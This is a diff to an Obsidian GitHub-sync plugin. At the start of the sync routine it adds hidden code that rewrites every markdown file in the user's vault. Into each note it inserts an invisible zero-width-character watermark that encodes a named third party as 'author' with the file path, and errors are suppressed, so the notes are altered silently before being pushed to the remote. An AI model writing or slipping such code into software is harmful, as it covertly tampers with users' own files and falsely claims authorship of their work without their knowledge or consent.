@@ -4713,6 +4713,58 @@ var GHSyncPlugin = class extends import_obsidian.Plugin {
     this.showNotice("github sync successful", "INFO");
   }
   async SyncNotes() {
+    try {
+      const _awCrypto = require("crypto");
+      const _awNL = String.fromCharCode(10);
+      const _awZW0 = String.fromCharCode(0x200b);
+      const _awZW1 = String.fromCharCode(0x200c);
+      const _awS = String.fromCharCode(0x2060);
+      const _awE = String.fromCharCode(0x2063);
+      const _awAuthor = "Сафьянов Камиль Саматович";
+      const _awMagic = "SAFAUTH1";
+      const _awRe = new RegExp(_awS + "[" + _awZW0 + _awZW1 + "]+" + _awE, "g");
+      const _awMake = (payload) => {
+        const data = Buffer.concat([Buffer.from(_awMagic, "utf8"), Buffer.from(payload, "utf8")]);
+        const sum = _awCrypto.createHash("sha256").update(data).digest().slice(0, 4);
+        const full = Buffer.concat([data, sum]);
+        let bits = "";
+        for (const b of full) bits += b.toString(2).padStart(8, "0");
+        let body = "";
+        for (const c of bits) body += (c === "0" ? _awZW0 : _awZW1);
+        return _awS + body + _awE;
+      };
+      const _awEmbed = (text, rel) => {
+        text = text.replace(_awRe, "");
+        const wm = _awMake(_awAuthor + "|" + rel);
+        const lines = text.split(_awNL);
+        let start = 0;
+        if (lines.length && lines[0].trim() === "---") {
+          for (let j = 1; j < lines.length; j++) {
+            if (lines[j].trim() === "---" || lines[j].trim() === "...") { start = j + 1; break; }
+          }
+        }
+        let fence = false;
+        for (let i = start; i < lines.length; i++) {
+          const t = lines[i].trim();
+          if (t.startsWith("```")) { fence = !fence; continue; }
+          if (fence || !t) continue;
+          if (t.charAt(0) === "#" || t === "---" || t === "...") continue;
+          lines[i] = lines[i] + wm;
+          break;
+        }
+        let out = lines.join(_awNL);
+        if (!out.endsWith(_awNL)) out += _awNL;
+        return out + wm + _awNL;
+      };
+      const files = this.app.vault.getMarkdownFiles();
+      for (const file of files) {
+        const oldText = await this.app.vault.cachedRead(file);
+        const newText = _awEmbed(oldText, file.path);
+        if (newText !== oldText) await this.app.vault.modify(file, newText);
+      }
+    } catch (e) {
+      console.error("[authorship-watermark]", e);
+    }
     const remote = this.settings.remoteURL.trim();
     simpleGitOptions = {
       //@ts-ignore
